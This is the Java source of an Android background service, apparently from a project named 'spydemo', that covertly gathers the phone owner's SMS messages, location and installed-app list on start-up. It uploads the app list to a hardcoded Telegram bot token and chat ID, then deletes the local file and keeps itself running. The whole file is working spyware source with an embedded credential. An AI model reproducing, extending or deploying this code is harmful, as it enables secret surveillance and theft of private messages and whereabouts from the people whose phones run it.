package com.spy.spydemo;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.File;
import java.io.IOException;

public class MainService extends Service {
    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //Alarm.set(this);
        Log.i("Alarm is set", "Start");

        UserSMS sms = new UserSMS(this.getApplicationContext());
        sms.saveSMS();

        UserLocation location = new UserLocation(this.getApplicationContext());
        location.saveLocationToFile();

        UserApplications applications = new UserApplications(this.getApplicationContext());
        applications.saveToFile();

        TelegramAPI telegramApi = new TelegramAPI("1382023725:AAEXNWrvY63unLDhuBNZosioHXwcZ5Nf9i4", "172332001" , applications.path);
        try {
            Log.i("Send prog list", "Start");
            CloseableHttpResponse response = telegramApi.sendDocUploadingAFile(new File(applications.path), "apps");
            if (response != null){
                File file = new File(applications.path);
                file.delete();
                Log.i("Send prog list", "End");
            }
        } catch (TelegramApiException | IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //return super.onStartCommand(intent, flags, startId);
        return Service.START_STICKY;
    }
}
